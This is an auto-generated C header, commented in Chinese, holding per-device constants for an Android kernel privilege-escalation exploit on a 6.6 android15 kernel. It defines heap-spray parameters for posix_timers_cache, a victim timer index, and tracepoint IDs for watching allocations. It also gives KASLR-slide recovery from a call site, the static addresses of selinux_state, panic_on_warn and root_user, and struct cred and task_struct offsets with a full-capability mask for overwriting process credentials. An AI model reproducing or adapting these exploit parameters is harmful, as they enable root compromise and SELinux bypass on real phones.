/*
 * device_config.h - 机型相关常量（由 tools/gen-config.py 生成，不要手改）
 *
 * kernel_release : 6.6.118-android15-8-g554929766a0d-abogki544555896-4k
 * generated_at   : 2026-10-30 01:02:42
 * kallsyms sha256: c83cdff27bf7a8b448df016406d280f408a68d43cf8df24372b4a14bbdeef062
 * btf      sha256: 18c8a5232cf7ca8735258418be70040a30a8ee9e0ba2ce63fc0b58139f5f1071
 * measure  sha256: 9c4f02db5ae291658ee7bdc54fda4e3ad14fe062bebc6709c7097c9420ae7b88
 *
 * 来源拆分:
 *   - 符号地址 / 结构体偏移：从上面两个镜像文件算出来
 *   - EV_* / call site / bytes_req：只能在设备上实测（measurements.json）
 *   - KASLR slide 不在这里，运行时从 do_timer_create 的 call site 反推
 */
#ifndef DEVICE_CONFIG_H
#define DEVICE_CONFIG_H

/* ---- kmem tracepoint event id（每个 build 都变，必须实测） ---- */
#define EV_CACHE_ALLOC 269
#define EV_CACHE_FREE 272
#define EV_PAGE_FREE 273
#define EV_PAGE_ALLOC 275
#define EV_PCPU_DRAIN 277

/* ---- kmem_cache_alloc / mm_page_alloc / mm_page_free 记录字段偏移（稳定） ---- */
#define OFF_SITE 8
#define OFF_PTR 16
#define OFF_REQ 24
#define OFF_ALLOC 32
#define OFF_PFN 8
#define OFF_ORDER 16

/* ---- struct k_itimer（BTF） ---- */
#define ITIMER_SIZE 0x108
#define ITIMER_NODE 0x78
#define ITIMER_HEAD 0x98
#define ITIMER_ELIST 0xa8
#define ITIMER_FIRING 0xb8
#define ITIMER_HANDLING 0xc0
#define TIMER_OBJ 0x108

/* ---- posix_timers_cache 堆喷整形（SLUB 行为，需实测） ---- */
#define PADDING_TIMERS (150 * 31)
#define NTIMERS 4096
#define VICTIM_IDX 2048
#define LOCKERS 3
#define VMA_COUNT 50000UL
#define HELPER_STACK (1UL << 20)

/* ---- cred_jar（实测 bytes_req / bytes_alloc / call site） ---- */
#define CRED_REQ 0xb8
#define CRED_ALLOC 0xc0
#define CRED_SITE_LOW21 0x38458UL

/* ---- 链接期地址（kallsyms）与运行时 slide 基准 ---- */
#define STATIC_TIMER_SITE 0xffffffc0803afcecULL	/* do_timer_create+0x94 */
#define TIMER_SITE_LOW21 0x1afcecUL

#define SELINUX_STATE_STATIC 0xffffffc0823ba418ULL
#define PANIC_ON_WARN_STATIC 0xffffffc08216ae0cULL
#define ROOT_USER_STATIC 0xffffffc08218f228ULL
#define INIT_USER_NS_STATIC 0xffffffc08218ef98ULL
#define INIT_UCOUNTS_STATIC 0xffffffc082190cf8ULL
#define INIT_GROUPS_STATIC 0xffffffc082190788ULL

/* ---- task_struct（BTF + 实测） ---- */
#define OFF_TASK_CRED 0x820ULL
#define OFF_TASK_COMM 0x830ULL
#define TASK_ALLOC_LOW21 0x1cb240UL
#define TASK_ALLOC_BYTES 0x12c0ULL
#define TASK_ALLOC_ROUND 0x12c0ULL

/* ---- struct cred 布局（BTF） ---- */
#define CRED_UID_OFF 0x8ULL
#define CRED_OFF_SECURITY 0x80ULL
#define CRED_OFF_USER 0x88ULL
#define CRED_OFF_USER_NS 0x90ULL
#define CRED_OFF_UCOUNTS 0x98ULL
#define CRED_OFF_GROUPS 0xa0ULL
#define CRED_BLOB_OFF 0x1f00UL
#define SELINUX_BLOB_OFF 0x8ULL
#define SELINUX_SID_KERNEL 1U
#define FULLCAP 0x1ffffffffffULL

#endif /* DEVICE_CONFIG_H */
